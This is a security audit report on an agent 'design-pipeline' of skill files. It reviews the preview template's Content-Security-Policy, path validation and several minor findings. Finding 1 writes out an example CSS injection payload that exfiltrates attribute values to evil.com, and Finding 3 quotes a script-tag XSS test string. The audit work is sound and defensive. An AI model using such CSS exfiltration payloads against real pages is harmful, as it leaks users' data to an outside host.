# Security Audit Report: design-pipeline

**Date:** 2026-03-25
**Auditor:** security-auditor
**Scope:** All SKILL.md files, preview-template.html, tech-spec.md, user-spec.md

---

## Key Decision Verification

### Decision 8: CSP Protection -- PASSED

`skills/design-generate/assets/preview-template.html` line 6 contains the required CSP meta tag:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com">
```

`script-src 'none'` blocks all JavaScript execution in generated HTML files, preventing XSS even if malicious content is injected through template placeholders.

### Decision 9: Path Validation -- PASSED

Both skills that create files from user-derived names include explicit validation:

- `skills/design-system-init/SKILL.md` (line 117): "Validate file name segments used in paths: component and page names follow `/^[a-z0-9-]+$/` -- alphanumeric and hyphens only. Reject names with path separators or special characters."
- `skills/design-generate/SKILL.md` (line 97): "Validate file names: only lowercase letters, digits, and hyphens allowed (`/^[a-z0-9-]+$/`). Reason: prevents path traversal when writing to `.design-system/pages/`"

---

## Findings

### Finding 1

- **Severity:** Medium
- **File:** `skills/design-generate/assets/preview-template.html:6`
- **Issue:** CSP allows `style-src 'unsafe-inline'` which permits CSS injection attacks. A malicious or crafted `{{PAGE_STYLES}}` or `{{PAGE_CONTENT}}` value could inject CSS that exfiltrates data via `background-image: url()` or uses CSS selectors to detect content on the page.
- **Attack vector:** If an attacker controls part of the page description that flows into `{{PAGE_STYLES}}` or `{{PAGE_CONTENT}}`, they could inject CSS like `input[value^="secret"] { background: url(https://evil.com/leak?v=secret) }`. However, exploitation requires: (a) the attacker controls user input to the agent, (b) the generated page contains sensitive data in attribute values, and (c) CSP does not restrict `img-src` or `connect-src`, which it currently does not.
- **Recommendation:** This is an accepted trade-off -- `unsafe-inline` is necessary for the design system to work (inline styles are the core mechanism). Risk is low because: the agent generates the content (not arbitrary user input directly), pages are local preview files (not served to third parties), and `script-src 'none'` blocks the most dangerous attack vector. To further harden, consider adding `img-src 'self' data:;` to the CSP to block external URL loading from CSS. No action required for MVP.

### Finding 2

- **Severity:** Low
- **File:** `skills/design-system-init/SKILL.md:222-224` (referenced in tech-spec.md)
- **Issue:** The verification step uses `node -e "JSON.parse(require('fs').readFileSync('.design-system/tokens.json'))"` to validate JSON. This executes a Node.js command that reads a file the agent just created. If `tokens.json` were somehow manipulated to contain a Node.js exploit (e.g., through a prototype pollution payload in JSON), the `JSON.parse` call is safe -- but the pattern of executing `node -e` with file contents as input should be noted.
- **Attack vector:** Theoretical only. The agent generates `tokens.json` itself -- there is no external input that flows directly into the file without agent mediation. `JSON.parse` is safe against code execution (unlike `eval`).
- **Recommendation:** No action required. The pattern is safe as used. Note for future reference: never use `require()` or `eval()` on untrusted JSON -- always use `JSON.parse()` which is the case here.

### Finding 3

- **Severity:** Low
- **File:** `skills/design-generate/SKILL.md:82-85`
- **Issue:** Template placeholder substitution (`{{PAGE_TITLE}}`, `{{PAGE_STYLES}}`, `{{PAGE_CONTENT}}`) is performed by the AI agent via string replacement, not by a templating engine with auto-escaping. The `{{PAGE_TITLE}}` placeholder appears inside `<title>` tag -- if a page name contains HTML entities (e.g., `<script>alert(1)</script>`), it could break the HTML structure. However, this is fully mitigated by: (a) Decision 9 filename validation (`/^[a-z0-9-]+$/`), (b) CSP `script-src 'none'`, and (c) the agent controls all content generation.
- **Attack vector:** Would require bypassing the agent's filename validation AND the CSP -- effectively impossible in this architecture.
- **Recommendation:** No action required for MVP. The defense-in-depth (validation + CSP) covers this adequately.

### Finding 4

- **Severity:** Low
- **File:** `skills/design-review/SKILL.md`, `skills/design-retrospective/SKILL.md`
- **Issue:** Neither design-review nor design-retrospective performs file name validation, because neither creates files in paths derived from user input. design-review is read-only. design-retrospective writes to fixed paths (`lessons-learned.md`, `design-principles.md`). This is correct behavior -- no finding, noted for completeness.
- **Attack vector:** None.
- **Recommendation:** No action required.

### Finding 5

- **Severity:** Low
- **File:** `skills/do-task/SKILL.md:49`
- **Issue:** The design-review hook in do-task spawns a subagent and passes "changed UI files" to it. The skill text says "spawn design-review subagent on changed UI files" but does not explicitly specify that file paths should be validated before passing to the subagent. In practice, the file paths come from `git diff` output (not user input), so they are trustworthy.
- **Attack vector:** Theoretical only -- would require manipulating git diff output, which is not a realistic vector.
- **Recommendation:** No action required. Git-derived file paths are trusted within the local development context.

---

## Checks Performed

| Check | Result |
|-------|--------|
| Hardcoded secrets (API keys, tokens, passwords) | None found |
| OWASP A01: Broken Access Control | N/A -- skills are agent instructions, no auth system |
| OWASP A02: Cryptographic Failures | N/A -- no cryptography used |
| OWASP A03: Injection (XSS) | CSP `script-src 'none'` mitigates. See Finding 1 for CSS injection note |
| OWASP A03: Injection (command) | No dynamic command construction from user input |
| OWASP A04: Insecure Design | Path validation (Decision 9) and CSP (Decision 8) are present by design |
| OWASP A05: Security Misconfiguration | CSP is correctly configured for the use case |
| OWASP A06: Vulnerable Components | No runtime dependencies -- skills are markdown |
| OWASP A07: Auth Failures | N/A -- no authentication in scope |
| OWASP A08: Software and Data Integrity | No deserialization of untrusted data. JSON.parse used safely |
| OWASP A09: Security Logging | N/A -- local development tool, no server-side logging needed |
| OWASP A10: SSRF | No HTTP requests from user-controlled URLs. Google Fonts loaded via static `<link>` tag |
| Prompt injection | Skills have clear scope guards and phase-based workflows. User input (descriptions, feedback) is interpreted by the agent, not executed as code |
| Path traversal | Validated via `/^[a-z0-9-]+$/` in both file-creating skills |
| Information disclosure | No reading of `.env`, credentials, or secrets. Scans limited to CSS/style files |
| Unsafe commands | No `rm`, `curl` to external URLs, `eval`, or `exec` in skill instructions |

---

## Summary

**Overall assessment: PASS**

No critical or high severity findings. The design-pipeline feature demonstrates good security awareness:

1. **CSP protection** (Decision 8) effectively prevents XSS in generated HTML files
2. **Path validation** (Decision 9) prevents directory traversal in both file-creating skills
3. **No runtime dependencies** eliminates dependency vulnerability risks
4. **Agent-mediated content generation** means user input never flows directly into code execution or file paths without validation

The 1 medium finding (CSS injection via `unsafe-inline`) is an accepted trade-off with low practical risk. The 4 low findings are informational notes with no action required.

**0 Critical | 0 High | 1 Medium | 4 Low**
